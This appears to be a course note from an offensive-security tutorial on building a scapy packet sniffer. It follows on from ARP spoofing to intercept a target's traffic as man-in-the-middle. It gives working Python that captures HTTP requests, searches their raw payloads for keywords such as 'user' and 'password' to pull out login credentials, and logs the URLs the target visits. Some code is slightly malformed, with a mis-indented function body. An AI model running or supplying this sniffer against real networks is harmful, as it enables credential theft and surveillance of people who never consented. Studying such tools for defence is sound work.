## 06 Packet Sniffer

### What is Packet Sniffing?
Recap ARP Spoofing
* we established our machine as the man-in-the-middle between a target and a gateway
* the packets that the target requests from the gateway flow through our machine
* these packets may contain website information, login and passwords, pictures, etc.
* but we have no way of knowing what's inside them

Why build a Packet Sniffer?
* to analyze and read this information, we need a packet sniffer
* its ulities include:
    * capture data flowing through an interface
    * filter data based on criteria
    * display (or log) useful data

### Building a Packet Sniffer
* again, `scapy` provides a sniffing function to help build our tool
    ```python
    def sniff(interface: str) -> scapy.Packet:
    scapy.sniff(
        iface=interface,
        store=False,        # don't store data
        prn=process_packet, # func to process sniffed packet
        filter=""           # ARP, UDP, TCP, BPF
    )
    ```
* although there are many supoorted filters, there is currently no included one for HTTPS 
    * there is add-on library for that [scapy_http](https://github.com/invernizzi/scapy-http)
    * install with `pip3 install scapy_http`
    * import with `from scapy.layers import http`
* now, we can print packets if they contain an HTTP-Request
    ```python
    def process_packet(packet: scapy.Packet):
        if packet.haslayer(http.HTTPRequest):
            if packet.haslayer(scapy.Raw):
                print(packet[scapy.Raw].load)
    ```
    * almost everything send of the browser is requested by HTTP (we'll later upgrade to HTTPS)
    * ideally, we want just username and password

### Extracting Data
Finding Login-Data
* within the raw-load of the HTTP-Request, you can usually find the username and password for the login (if the user has entered it)
* in order to filter them out from other raw-load data, we have search it
    * the information is passed by variables named by the web developers, so it is good to check for multiple keywords
    * searching for sub-strings
    ```python
    KEYWORDS = ["user", "username", "login", "email", "password", "pass"]

    for kw in KEYWORDS:
        if kw in str(load):
            print(load)
            break
    ```

Extracting URLs
* other useful information to find may be URLs that the target has visited
* the HTTP-Request layer also contains the URL consisting of two fields
    * 1 is the `host` or domain name
    * 2 is the specific `path` or address
    ```python
    # extract URL
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    print(url)
    ```